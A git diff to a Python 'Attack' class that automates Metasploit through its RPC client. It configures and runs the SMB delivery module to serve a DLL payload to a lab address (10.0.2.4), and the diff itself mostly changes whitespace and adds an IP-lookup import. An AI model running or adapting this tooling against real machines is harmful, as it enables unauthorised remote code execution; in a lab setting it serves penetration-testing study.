@@ -1,6 +1,7 @@
 from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PostModule, EncoderModule, AuxiliaryModule, NopModule, \
     PayloadModule
 
+from get_ipv4 import get_ipv4
 from libs.Modules import Modules
 from libs.Payloads import *
 
@@ -41,13 +42,13 @@ class Attack:
             .console(self.__rpc.consoles.console().cid)
             .run_module_with_output(self.__module, PayloadModule(self.__rpc, self.__payload.value))
         )
-    
+
     def run_smb_delivery(self):
         first_slash_index = self.__module_path.value.find('/')
         mtype = self.__module_path.value[:first_slash_index]
         mname = self.__module_path.value[first_slash_index + 1:]
         self.__module = self.__rpc.modules.use(mtype, mname)
-        self.__module.target = 0 # set DLL
+        self.__module.target = 0  # set DLL
         # self.__module.targets => {0: 'DLL', 1: 'PSH'}
         self.__module["SRVHOST"] = self.__ipv4
         cid = self.__rpc.consoles.console().cid
@@ -55,9 +56,8 @@ class Attack:
         print(
             console.run_module_with_output(self.__module)
         )
-        print(console.read()) 
+        print(console.read())
         # Maybe show in GUI
-
 
 
 if __name__ == '__main__':
@@ -66,4 +66,3 @@ if __name__ == '__main__':
     atk = Attack(client, '10.0.2.4')
     atk.setModule(Modules.SMB_DELIVERY)
     atk.run_smb_delivery()
-    
